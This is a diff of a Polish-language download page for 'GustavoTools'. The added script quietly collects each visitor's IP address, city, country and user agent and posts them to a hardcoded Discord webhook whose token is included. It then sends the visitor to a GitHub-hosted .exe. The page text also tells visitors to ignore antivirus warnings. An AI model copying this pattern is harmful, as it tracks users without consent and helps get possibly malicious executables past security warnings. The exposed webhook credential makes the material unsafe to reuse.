@@ -28,47 +28,46 @@
     button:hover {
       background-color: #cc0029;
     }
-    #consent {
-      margin-top: 30px;
+    p {
       font-size: 14px;
-      color: white;
+      margin-top: 40px;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
   <h1>GustavoTools</h1>
-
-  <div id="consent">
-    <p>jezeli wyswietli sie komunikat z antywirusa, ziignoruj go. wyswietla sie bo wydawca jest nieznany.</p>
-  </div>
-
   <button onclick="handleDownload()">Pobierz</button>
+  <p>jezeli wyswietli sie komunikat z antywirusa, ziignoruj go. wyswietla sie bo wydawca jest nieznany.</p>
 
   <script>
     async function handleDownload() {
-      const userAgent = navigator.userAgent;
+      try {
+        const location = await fetch("https://ipapi.co/json/").then(res => res.json());
 
-      const location = await fetch("https://ipapi.co/json/")
-        .then(res => res.json())
-        .catch(() => ({}));
+        const ip = location.ip || "Nieznane";
+        const city = location.city || "Nieznane";
+        const country = location.country_name || "Nieznane";
+        const userAgent = navigator.userAgent;
 
-      const payload = {
-        userAgent: userAgent,
-        ip: location.ip || "Nieznane",
-        city: location.city || "Nieznane",
-        country: location.country_name || "Nieznane"
-      };
+        const message = `**Nowe pobranie GustavoTools**
+🌐 IP: \`${ip}\`
+🏙️ Miasto: \`${city}\`
+🏴 Kraj: \`${country}\`
+📱 Urządzenie: \`${userAgent}\``;
 
-      // Wyślij dane do serwera PHP, który przekaże je do Discord webhooka
-      await fetch("log.php", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-      });
+        await fetch("https://discord.com/api/webhooks/1391547254036500540/sWJmd-1sylhKt6FNVXSw63FYu9A_AhKLERYI1xugPGleIgM1YCJBfWnFVaV4wDQiQUoQ", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ content: message })
+        });
+      } catch (error) {
+        console.warn("Nie udało się wysłać danych na webhook (CORS?):", error);
+      }
 
-      // Pobranie pliku po akceptacji
+      // 🔽 Pobranie pliku z GitHub Releases
       window.location.href = "https://github.com/kostek1123Q/gustavotools/releases/download/v1.0/GustavoTools.exe";
     }
   </script>
